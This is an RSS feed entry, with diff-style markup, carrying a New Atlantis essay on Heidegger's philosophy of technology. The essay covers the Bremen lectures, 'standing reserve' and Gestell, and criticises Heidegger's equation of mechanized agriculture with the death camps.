+<p>Heidegger applies this understanding of experience in later writings that are focused explicitly on technology, where he goes beyond the traditional view of technology as machines and technical procedures. He instead tries to think through the <i>essence of technology</i> as a way in which we encounter entities generally, including nature, ourselves, and, indeed, everything. Heidegger’s most influential work on technology is the lecture “The Question Concerning Technology,” published in 1954, which was a revised version of part two of a four-part lecture series he delivered in Bremen in 1949 (his first public speaking appearance since the end of the war). These Bremen lectures have recently been <a href="http://www.amazon.com/dp/0253002311?tag=the-new-atlantis-20">translated into English</a>, for the first time, by Andrew J. Mitchell.</p>
+
+
+
+<p>Introducing the Bremen lectures, Heidegger observes that because of technology, “all distances in time and space are shrinking” and “yet the hasty setting aside of all distances brings no nearness; for nearness does not consist in a small amount of distance.” The lectures set out to examine what this nearness is that remains absent and is “even warded off by the restless removal of distances.” As we shall see, we have become almost incapable of experiencing this nearness, let alone understanding it, because all things increasingly present themselves to us as technological: we see them and treat them as what Heidegger calls a “standing reserve,” supplies in a storeroom, as it were, pieces of inventory to be ordered and conscripted, assembled and disassembled, set up and set aside. Everything approaches us merely as a source of energy or as something we must organize. We treat even human capabilities as though they were only means for technological procedures, as when a worker becomes nothing but an instrument for production. Leaders and planners, along with the rest of us, are mere human resources to be arranged, rearranged, and disposed of. Each and every thing that presents itself technologically thereby loses its distinctive independence and form. We push aside, obscure, or simply cannot see, other possibilities.</p>
+
+
+
+<p>Common attempts to rectify this situation don’t solve the problem and instead are part of it. We tend to believe that technology is a means to our ends and a human activity under our control. But in truth we now conceive of means, ends, and ourselves as fungible and manipulable. Control and direction are technological control and direction. Our attempts to master technology still remain within its walls, reinforcing them. As Heidegger says in the third of his Bremen lectures, “all this opining concerning technology” — the common critique of technology that denounces its harmful effects, as well as the belief that technology is nothing but a blessing, and especially the view that technology is a neutral tool to be wielded either for good or evil — all of this only shows “how the dominance of the essence of technology orders into its plundering even and especially the human conceptions concerning technology.” This is because “with all these conceptions and valuations one is from the outset unwittingly in agreement that technology would be a means to an end.” This “instrumental” view of technology is correct, but it “does not show us technology’s essence.” It is correct because it sees something pertinent about technology, but it is essentially misleading and not true because it does not see how technology is a way that all entities, not merely machines and technical processes, now present themselves.</p>
+
+
+
+<p>Of course, were there no way out of technological thinking, Heidegger’s own standpoint, however sophisticated, would also be trapped within it. He attempts to show a way out — a way to think about technology that is not itself beholden to technology. This leads us into a realm that will be familiar to those acquainted with Heidegger’s work on “being,” the central issue in <i>Being and Time</i> and one that is also prominent in some of the Bremen lectures. The basic phenomenon that belongs together with being is truth, or “revealing,” which is the phenomenon Heidegger brings forward in his discussion in “The Question Concerning Technology.” Things can show or reveal themselves to us in different ways, and it is attention to this that will help us recognize that technology is itself one of these ways, but only one. Other kinds of revealing, and attention to the realm of truth and being as such, will allow us to “experience the technological within its own bounds.”</p>
+
+
+
+<p>Only then will “another whole realm for the essence of technology … open itself up to us. It is the realm of revealing, i.e., of truth.” Placing ourselves back in this realm avoids the reduction of things and of ourselves to mere supplies and reserves. This step, however, does not guarantee that we will fully enter, live within, or experience this realm. Nor can we predict what technology’s fate or ours will be once we do experience it. We can at most say that older and more enduring ways of thought and experience might be reinvigorated and re-inspired. Heidegger believes his work to be preparatory, illuminating ways of being and of being human that are not merely technological.</p>
+
+
+
+<p>One way by which Heidegger believes he can enter this realm is by attending to the original meaning of crucial words and the phenomena they reveal. Original language — words that precede explicit philosophical, technological, and scientific thought and sometimes survive in colloquial speech — often shows what is true more tellingly than modern speech does. (Some poets are for Heidegger better guides on the quest for truth than professional philosophers.) The two decisive languages, Heidegger thinks, are Greek and German; Greek because our philosophical heritage derives its terms from it (often in distorted form), and German, because its words can often be traced to an origin undistorted by philosophical reflection or by Latin interpretations of the Greek. (Some critics believe that Heidegger’s reliance on what they think are fanciful etymologies warps his understanding.)</p>
+
+
+
+<p>Much more worrisome, however, is that Heidegger’s thought, while promising a comprehensive view of the essence of technology, by virtue of its inclusiveness threatens to blur distinctions that are central to human concerns. Moreover, his emphasis on technology’s broad and uncanny scope ignores or occludes the importance and possibility of ethical and political choice. This twofold problem is most evident in the best-known passage from the second Bremen lecture: “Agriculture is now a mechanized food industry, in essence the same as the production of corpses in the gas chambers and extermination camps, the same as the blockading and starving of countries, the same as the production of hydrogen bombs.” From what standpoint could mechanized agriculture and the Nazis’ extermination camps be “in essence the same”? If there is such a standpoint, should it not be ignored or at least modified because it overlooks or trivializes the most significant matters of choice, in this case the ability to detect and deal with grave injustice? Whatever the full and subtle meaning of “in essence the same” is, Heidegger fails to address the difference in ethical weight between the two phenomena he compares, or to show a path for just political choice. While Heidegger purports to attend to concrete, ordinary experience, he does not consider seriously justice and injustice as fundamental aspects of this experience. Instead, Heidegger claims that what is “horrifying” is not any of technology’s particular harmful effects but “what transposes … all that is out of its previous essence” — that is to say, what is dangerous is that technology displaces beings from what they originally were, hindering our ability to experience them truly.</p>
+
+
+<div><div>
+  
+	<h5>
+		What Is the Essence of Technology?	</h5>
+</div></div>
+
+
+<p>Let us now follow Heidegger’s understanding of technology more exactingly, relying on the Bremen lectures and “The Question Concerning Technology,” and beginning with four points of Heidegger’s critique (some of which we have already touched on).</p>
+
+
+
+<p><i>First</i>, the essence of technology is not something we make; it is a mode of being, or of revealing. This means that technological things have their own novel kind of presence, endurance, and connections among parts and wholes. They have their own way of presenting themselves and the world in which they operate. The essence of technology is, for Heidegger, not the best or most characteristic instance of technology, nor is it a nebulous generality, a form or idea. Rather, to consider technology essentially is to see it as an event to which we belong: the structuring, ordering, and “requisitioning” of everything around us, and of ourselves. The <i>second</i> point is that technology even holds sway over beings that we do not normally think of as technological, such as gods and history. <i>Third</i>, the essence of technology as Heidegger discusses it is primarily a matter of modern and industrial technology. He is less concerned with the ancient and old tools and techniques that antedate modernity; the essence of technology is revealed in factories and industrial processes, not in hammers and plows. And <i>fourth</i>, for Heidegger, technology is not simply the practical application of natural science. Instead, modern natural science can understand nature in the characteristically scientific manner only because nature has already, in advance, come to light as a set of calculable, orderable forces — that is to say, technologically.</p>
+
+
+
+<p>Some concrete examples from Heidegger’s writings will help us develop these themes. When Heidegger says that technology reveals things to us as “standing reserve,” he means that everything is imposed upon or “challenged” to be an orderly resource for technical application, which in turn we take as a resource for further use, and so on interminably. For example, we challenge land to yield coal, treating the land as nothing but a coal reserve. The coal is then stored, “on call, ready to deliver the sun’s warmth that is stored in it,” which is then “challenged forth for heat, which in turn is ordered to deliver steam whose pressure turns the wheels that keep a factory running.” The factories are themselves challenged to produce tools “through which once again machines are set to work and maintained.”</p>
+
+
+
+<p>The passive voice in this account indicates that these acts occur not primarily by our own doing; we belong to the activity. Technological conscriptions of things occur in a sense prior to our actual technical use of them, because things must be (and be seen as) already available resources in order for them to be used in this fashion. This availability makes planning for technical ends possible; it is the heart of what in the Sixties and Seventies was called the inescapable “system.” But these technical ends are never ends in themselves: “A success is that type of consequence that itself remains assigned to the yielding of further consequences.” This chain does not move toward anything that has its own presence, but, instead, “only enters into its circuit,” and is “regulating and securing” natural resources and energies in this never-ending fashion.</p>
+
+
+
+<p>Technology also replaces the familiar connection of parts to wholes; everything is just an exchangeable piece. For example, while a deer or a tree or a wine jug may “stand on its own” and have its own presence, an automobile does not: it is challenged “for a further conducting along, which itself sets in place the promotion of commerce.” Machines and other pieces of inventory are not parts of self-standing wholes, but arrive piece by piece. These pieces do share themselves with others in a sort of unity, but they are isolated, “shattered,” and confined to a “circuit of orderability.” The isolated pieces, moreover, are uniform and exchangeable. We can replace one piece of standing reserve with another. By contrast, “My hand … is not a piece of me. I myself am entirely in each gesture of the hand, every single time.”</p>
+
+
+
+<p>Human beings too are now exchangeable pieces. A forester “is today positioned by the lumber industry. Whether he knows it or not, he is in his own way a piece of inventory in the cellulose stock” delivered to newspapers and magazines. These in turn, as Heidegger puts it in “The Question Concerning Technology,” “set public opinion to swallowing what is printed, so that a set configuration of opinion becomes available on demand.” Similarly, radio and its employees belong to the standing reserve of the public sphere; everything in the public sphere is ordered “for anyone and everyone without distinction.” Even the radio listener, whom we are nowadays accustomed to thinking of as a free consumer of mass media — after all, he “is entirely free to turn the device on and off” — is actually still confined in the technological system of producing public opinion. “Indeed, he is only free in the sense that each time he must free himself from the coercive insistence of the public sphere that nevertheless ineluctably persists.”</p>
+
+
+
+<p>But the essence of technology does not just affect things and people. It “attacks everything that is: Nature and history, humans, and divinities.” When theologians on occasion cite the beauty of atomic physics or the subtleties of quantum mechanics as evidence for the existence of God, they have, Heidegger says, placed God “into the realm of the orderable.” God becomes technologized. (Heidegger’s word for the essence of technology is <i>Gestell</i>. While the translator of the Bremen lectures, Andrew Mitchell, renders it as “positionality,” William Lovitt, the translator of “The Question Concerning Technology” in 1977 chose the term “enframing.” It almost goes without saying that neither term can bring out all the nuances that Heidegger has in mind.)</p>
+
+
+
+<p>The heart of the matter for Heidegger is thus not in any particular machine, process, or resource, but rather in the “challenging”: the way the essence of technology operates on our understanding of all matters and on the presence of those matters themselves — the all-pervasive way we confront (and are confronted by) the technological world. Everything encountered technologically is exploited for some technical use. It is important to note, as suggested earlier, that when Heidegger speaks of technology’s essence in terms of challenging or positionality, he speaks of modern technology, and excludes traditional arts and tools that we might in some sense consider technological. For instance, the people who cross the Rhine by walking over a simple bridge might also seem to be using the bridge to challenge the river, making it a piece in an endless chain of use. But Heidegger argues that the bridge in fact allows the river to be itself, to stand within its own flow and form. By contrast, a hydroelectric plant and its dams and structures transform the river into just one more element in an energy-producing sequence. Similarly, the traditional activities of peasants do not “challenge the farmland.” Rather, they protect the crops, leaving them “to the discretion of the growing forces,” whereas “agriculture is now a mechanized food industry.”</p>
+
+
+
+<p>Modern machines are therefore not merely more developed, or self-propelled, versions of old tools such as water or spinning wheels. Technology’s essence “has already from the outset abolished all those places where the spinning wheel and water mill previously stood.” Heidegger is not concerned with the elusive question of precisely dating the origin of modern technology, a question that some think important in order to understand it. But he does claim that well before the rise of industrial mechanization in the eighteenth century, technology’s essence was already in place. “It first of all lit up the region within which the invention of something like power-producing machines could at all be sought out and attempted.” We cannot capture the essence of technology by describing the makeup of a machine, for “every construction of every machine already moves within the essential space of technology.”</p>
+
+
+
+<p>Even if the essence of technology does not originate in the rise of mechanization, can we at least show how it follows from the way we apprehend nature? After all, Heidegger says, the essence of technology “begins its reign” when modern natural science is born in the early seventeenth century. But in fact we cannot show this because in Heidegger’s view the relationship between science and technology is the reverse of how we usually think it to be; natural forces and materials belong to technology, rather than the other way around. It was technological thinking that first understood nature in such a way that nature could be challenged to unlock its forces and energy. The challenge preceded the unlocking; the essence of technology is thus prior to natural science. “Modern technology is not applied natural science, far more is modern natural science the application of the essence of technology.” Nature is therefore “the fundamental piece of inventory of the technological standing reserve — and nothing else.”</p>
+
+
+
+<p>Given this view of technology, it follows that any scientific account obscures the essential being of many things, including their nearness. So when Heidegger discusses technology and nearness, he assures us that he is not simply repeating the cliché that technology makes the world smaller. “What is decisive,” he writes, “is not that the distances are diminishing with the help of technology, but rather that nearness remains outstanding.” In order to experience nearness, we must encounter things in their truth. And no matter how much we believe that science will let us “encounter the actual in its actuality,” science only offers us representations of things. It “only ever encounters that which its manner of representation has previously admitted as a possible object for itself.”</p>
+
+
+
+<p>An example from the second lecture illustrates what Heidegger means. Scientifically speaking, the distance between a house and the tree in front of it can be measured neutrally: it is thirty feet. But in our everyday lives, that distance is not as neutral, not as abstract. Instead, the distance is an aspect of our concern with the tree and the house: the experience of walking, of seeing the tree’s shape grow larger as I come closer, and of the growing separation from the home as I walk away from it. In the scientific account, “distance appears to be first achieved in an opposition” between viewer and object. By becoming indifferent to things as they concern us, by representing both the distance and the object as simple but useful mathematical entities or philosophical ideas, we lose our truest experience of nearness and distance.</p>
+
+
+<div><div>
+  
+	<h5>
+		Turning To and Away from Danger	</h5>
+</div></div>
+
+
+<p>It is becoming clear by now that in order to understand the essence of technology we must also understand things non-technologically; we must enter the realm where things can show themselves to us truthfully in a manner not limited to the technological. But technology is such a domineering force that it all but eliminates our ability to experience this realm. The possibility of understanding the interrelated, meaningful, practical involvements with our surroundings that Heidegger describes is almost obliterated. The danger is that technology’s domination fully darkens and makes us forget our understanding of ourselves as the beings who can stand within this realm.</p>
+
+
+
+<p>The third Bremen lecture lays out just how severe the problem is. While we have already seen how the essence of technology prevents us from encountering the reality of the world, now Heidegger points out that technology has <i>become</i> the world (“world and positionality are the same”). Technology reigns, and we therefore forget being altogether and our own essential freedom — we no longer even realize the world we have lost. Ways of experiencing distance and time other than through the ever more precise neutral measuring with rulers and clocks become lost to us; they no longer seem to be types of knowing at all but are at most vague poetic representations. While many other critics of technology point to obvious dangers associated with it, Heidegger emphasizes a different kind of threat: the possibility that it may prevent us from experiencing “the call of a more primal truth.” The problem is not just that technology makes it harder for us to access that realm, but that it makes us altogether forget that the realm exists.</p>
+
+
+
+<p>Yet, Heidegger argues, recognizing this danger allows us to glimpse and then respond to what is forgotten. The understanding of man’s essence as openness to this realm and of technology as only one way in which things can reveal themselves is the guide for keeping technology within its proper bounds. Early in the fourth and last Bremen lecture, Heidegger asks if the danger of technology means “that the human is powerless against technology and delivered over to it for better or worse.” No, he says. The question, however, is not how one should <i>act</i> with regard to technology — the question that seems to be “always closest and solely urgent” — but how we should <i>think</i>, for technology “can never be overcome,” we are never its master. Proper thinking and speaking, on the other hand, allow us to be ourselves and to reveal being. “Language is … never merely the expression of thinking, feeling, and willing. Language is the inceptual dimension within which the human essence is first capable of corresponding to being.” It is through language, by a way of thinking, that “we first learn to dwell in the realm” of being.</p>
+
+
+
+<p>The thought that opens up the possibility of a “turn” away from technology and toward its essential realm is the realization of its danger. Heidegger quotes the German poet Friedrich Hölderlin: “But where the danger is, there grows also what saves.” By illuminating this danger, Heidegger’s path of thinking is a guide for turning away from it. The turn brings us to a place in which the truth of being becomes visible as if by a flash of lightning. This flash does not just illuminate the truth of being, it also illuminates us: we are “caught sight of in the insight.” As our own essence comes to light, if we disavow “human stubbornness” and cast ourselves “before this insight,” so too does the essence of technology come to light.</p>
+
+
+<div><div>
+  
+	<h5>
+		The Way of Nature and Poetry	</h5>
+</div></div>
+
+
+<p>A closer look at “The Question Concerning Technology” and some of the ways it adds to the Bremen lectures will help us further to clarify Heidegger’s view. In the Bremen lectures, Heidegger focuses on the contrast between entities seen as pieces in an endless technological chain on the one hand, and “things” that reveal being by bringing to light the rich interplay between gods and humans, earth and sky on the other. His example of such a “thing” in the first lecture is a wine jug used for sacrificial libation: The full jug gathers in itself the earth’s nutrients, rain, sunshine, human festivities, and the gift to the gods. All of these together help us understand what the wine jug is. In “The Question Concerning Technology,” it is products understood in a certain way that Heidegger contrasts with technology’s revealing. Drawing on Aristotle’s account of formal, final, material, and efficient causes, Heidegger argues that both nature (<i>physis</i>) and art (<i>poiesis</i>) are ways of “bringing-forth” — of unconcealing that which is concealed. What is natural is self-producing, self-arising, self-illuminating, not what can be calculated in order to become a formless resource. Poetry also brings things to presence. Heidegger explains that the Greek word <i>techne</i>, from which “technology” derives, at one time also meant the “bringing-forth of the true into the beautiful” and “the <i>poiesis </i>of the fine arts.”</p>
+
+
+
+<p>In contrast to Heidegger’s notion of a thing or of revealing stands the kind of objectivity for which our natural sciences strive. But in spite of what Heidegger himself borrows from Greek thought, he emphasizes that there is a link between modern technology and classic philosophy because of Plato’s understanding of being as permanent presence. For Plato, the “idea” of a thing — what it is — is its enduring look, which “is not and never will be perceivable with physical eyes” and cannot be experienced with the other senses either. This attention to what is purely present in contemplation, Heidegger argues, ultimately leads us to forget the being of things, what is brought forth, and the world of human concern.</p>
+
+
+
+<p>Heidegger’s brief sketches in these lectures suggest powerful alternatives to technological understanding that help us to recognize its limits. In “The Question Concerning Technology,” Heidegger’s hope is to “prepare a free relationship to [technology]. The relationship will be free if it opens our human existence to the essence of technology.” It is not the case “that technology is the fate of our age, where ‘fate’ means the inevitableness of an unalterable course.” Experiencing technology as a kind — but only one kind — of revealing, and seeing man’s essential place as one that is open to different kinds of revealing frees us from “the stultified compulsion to push on blindly with technology or, what comes to the same, to rebel helplessly against it and curse it as the work of the devil.” Indeed, Heidegger says at the end of the lecture, our examining or questioning of the essence of technology and other kinds of revealing is “the piety of thought.” By this questioning we may be saved from technology’s rule.</p>
+
+
+
+
+
+<p>Heidegger’s discussions offer several useful directions for dealing with technology, even if one disagrees with elements of his analysis. Consider his view of distance, where he differentiates neutral measured distance and geometrical shape from the spaces and distances with which we concern ourselves day by day. Someone thousands of miles away can be immediately present to one’s feelings and thoughts. Two tables may have identical size, yet each may be too big or small for comfortable, practical, or beautiful use. Heidegger’s understanding of the importance of space changes somewhat in his works, but what matters for us is his insistence that our understanding of the spaces in which we live is neither inferior nor reducible to a neutral, technical, scientific understanding of space. This is also true of time, direction, and similar matters. Perhaps most profoundly, Heidegger attempts to make visible an understanding of what is present, enduring, and essential that differs from a notion of the eternal based on time understood narrowly and neutrally. Heidegger’s alternatives provide ways to clarify the irreducibility of our experience to what we can capture technologically, or through natural science. One example of this irreducibility is Aristotle’s virtue, which acts in light of the right time, the right place, and the right amount, not in terms of measures that are abstracted from experience. Ordinary human ways of understanding are not mere folk opinion that is subservient to science, as some might say; they offer an account of how things are that can be true in its own way.</p>
+
+
+
+<p>A second direction that Heidegger gives us for properly situating technology is his novel understanding of human being. For Heidegger, the traits that make us human are connected to our openness to being and to what can be revealed, to our standing in a clearing where things can approach us meaningfully. One feature of this understanding is that Heidegger pays attention to the place of moods as well as of reason in allowing things to be intelligible. Another feature is his concern for the unity in meaning in what is and is not, in presence and absence. For instance, an absent friend impresses on us the possibility of friendship as much as one who stands before us.</p>
+
+
+
+<p>Central to Heidegger’s understanding of human being is the importance of death and dying in our understanding of our independence and wholeness. The importance of dying governs his choice of one of the examples he uses in the second Bremen lecture to clarify the difference between technology and ordinary concern:</p>
+
+
+
+<blockquote><p>The carpenter produces a table, but also a coffin…. [He] does not complete a box for a corpse. The coffin is from the outset placed in a privileged spot of the farmhouse where the dead peasant still lingers. There, a coffin is still called a “death-tree.” The death of the deceased flourishes in it. This flourishing determines the house and farmstead, the ones who dwell there, their kin, and the neighborhood. Everything is otherwise in the motorized burial industry of the big city. Here no death-trees are produced.</p></blockquote>
+
+
+
+<p>The significance of mortality fits together with Heidegger’s thought about reverence and gods. Gratitude, thankfulness, and restraint are proper responses to knowing ourselves as beings who are mortal. Heidegger does not have in mind dignity in a conventional moral or Christian sense. Rather, he has in view the inviolability of being human and of things as they can be revealed. Reestablishing the experience of reverence is central for limiting the control of technological thinking.</p>
+
+
+<div><div>
+  
+	<h5>
+		The Necessity of Making Distinctions	</h5>
+</div></div>
+
+
+<p>Heidegger’s arguments about technology also raise several difficulties. Most pressingly, he obscures the grounds for ranking what we may choose, and thus for choice itself. How exactly are the death camps different from, and more horrible than, mechanized agriculture, if they are “in essence” the same? How can we understand technology to be powerful but not so rigidly encompassing as to eclipse possibilities for ethical action?</p>
+
+
+
+<p>Heidegger’s analysis of technology has something in common with what the early modern thinkers — from Machiavelli through Locke and beyond — who first established the link between modern science and practical life, considered to be radical in their endeavors: the importance of truth merely as effectiveness, of nature as conquerable, of energy and force as tools for control. In contrast to Heidegger, however, for these thinkers such views are tied to a larger argument about happiness and what is good. Now, these early modern views of science and practical life — and alternative views, such as those expressed in classical thought — seem to be the true grounds for understanding the dominance of technology, and also for our ability to limit this dominance. The question we must ask is what Heidegger adds to the discussion of these thinkers, if they account for the realm of openness, revealing, and significance that Heidegger appears to have discovered, while affording grounds for moral ranking and prudential judgment absent in Heidegger.</p>
+
+
+
+<p>Indeed, one might ask (despite Heidegger’s objection to the question) whence technology arises in its essence. Is the way that beings present themselves to us meaningful only in Heidegger’s sense, or can an account be given for this meaning that at the same time allows and even demands moral choice and openness to being beyond what Heidegger allows? Because matters appear to us technologically in a way that seems tied to choices we make based on particular views of happiness, of the good, and of the sacred (all of which are at least to some extent subject to rational discussion), isn’t it true that everything technological can be judged, disputed, evaluated, and ranked? Is our understanding of happiness, of the good, and of the sacred truly subservient to a prior understanding of entities as technological, or is it instead interspersed and coeval with it, or even prior to it?</p>
+
+
+
+<p>We see in Heidegger’s other works instances where he amalgamates radical differences, similar to if less grotesque than comparing death camps and mechanized agriculture, such as his claim that America and communist Russia are “metaphysically” the same, both equally dominated by technology and the “rootless organization of the average man.” This claim again indicates how Heidegger’s view of metaphysical identity can distort significant differences, and how to attend to and choose among them. Things that present themselves technologically in Heidegger’s sense seem so controlled by a pervasive unified horizon that the possibility of our grasping and ranking these differences — whether from within a technological understanding or from outside — remains obscure. In response, we might suggest that the distortion and the overreaching that make elements of technology questionable are in fact visible within technological activity itself because of the larger political and ordered world to which it belongs. This is not a causally reductive relation, but a descriptive and organizing one. To experience technology is also to experience its limits. We recognize the gulf between death camps and mechanized agriculture, and the difference in kind between Soviet tyranny and American freedom, despite seeming similarities with respect to the place of technology, because these belong to larger wholes about which we can judge. Perhaps the key to understanding technology and to guiding it is, despite Heidegger’s animadversions, precisely to wonder about the ordinary question of how to use technology well, not piece by piece to serve isolated desires, but as part of a whole way of life.</p>
+                  </div></div>]]></content:encoded>
+      <pubDate>Sun, 08 Aug 2021 15:23:14 +0000</pubDate>
+      <source>https://www.thenewatlantis.com/publications/understanding-heidegger-on-technology</source>
+    </item>
   </channel>
 </rss>
